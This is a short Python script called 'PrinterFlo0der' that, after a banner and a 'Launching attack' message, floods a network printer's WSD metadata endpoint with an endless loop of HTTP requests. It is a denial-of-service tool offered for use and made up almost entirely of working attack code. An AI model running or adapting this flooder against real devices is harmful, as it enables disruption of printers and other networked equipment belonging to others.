import sys
import time
import requests
import os
import urllib.request
import re
import random

nmb = 1
url = 'http://192.168.1.28/wsd/pnpx-metadata.cgi'
r = requests.get(url)

def banner() :
    os.system('title PrinterFlo0der')
    os.system('cls')
    print('################################################################')
    print('#                        PrinterFlo0der                        #')
    print('#                         Beta Version                         #')
    print('################################################################')
    print(' ')
    print(' ')
    print(' ')

try :
    banner()
    a=input('[+] Press [ENTER] to start...')
    print('[+] Launching attack...')
    print(' ')
    time.sleep(1)

    while True :
        try :
            try :
                urllib.request.urlopen(url).read()
            except urllib.error.HTTPError :
                pass
            sys.stdout.write("\r{0}".format('[+] Request number '+str(nmb)+' sent to '+url+' (status code '+str(r.status_code)+')'))
            sys.stdout.flush()
            nmb = nmb + 1
        except Exception as e:
            print('[-] Woops something went wrong here !')
            print(e)
            sys.exit()
    

except KeyboardInterrupt :
    print(' ')
    print(' ')
    print('[-] Keyboard interrupt detected...')
    print('[+] See you later !')
    sys.exit()



